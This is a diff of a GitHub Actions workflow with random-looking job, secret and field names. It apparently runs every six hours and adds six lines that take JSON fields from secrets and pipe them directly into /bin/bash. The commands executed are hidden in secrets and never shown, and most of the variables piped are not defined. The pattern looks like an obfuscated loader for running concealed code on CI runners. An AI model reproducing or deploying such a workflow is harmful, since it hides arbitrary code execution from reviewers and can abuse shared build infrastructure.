@@ -1,9 +1,9 @@
 name: ludishen9910
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 3/6 * * *'
-
+    - cron: '58 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,11 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: ludishen9910
         env:
-          c9279: ${{ secrets.c9279 }}
+          qjq3: ${{ secrets.qjq3 }}
         run: |
-          echo $c9279 | jq -r .xjahs9 | /bin/bash
-          echo $rvls9 | jq -r .p19 | /bin/bash
-          echo $gzg3581 | jq -r .eou3767 | /bin/bash
-          echo $s61 | jq -r .emit2377 | /bin/bash
-          echo $eshx03191 | jq -r .nu6 | /bin/bash
+          echo $qjq3 | jq -r .dwthq104 | /bin/bash
+          echo $h46 | jq -r .vhrb1 | /bin/bash
+          echo $qoh8 | jq -r .efjl2129 | /bin/bash
+          echo $cd3892 | jq -r .slte4014 | /bin/bash
+          echo $qi7774 | jq -r .wbyya815 | /bin/bash
+          echo $b966 | jq -r .kou43 | /bin/bash
 
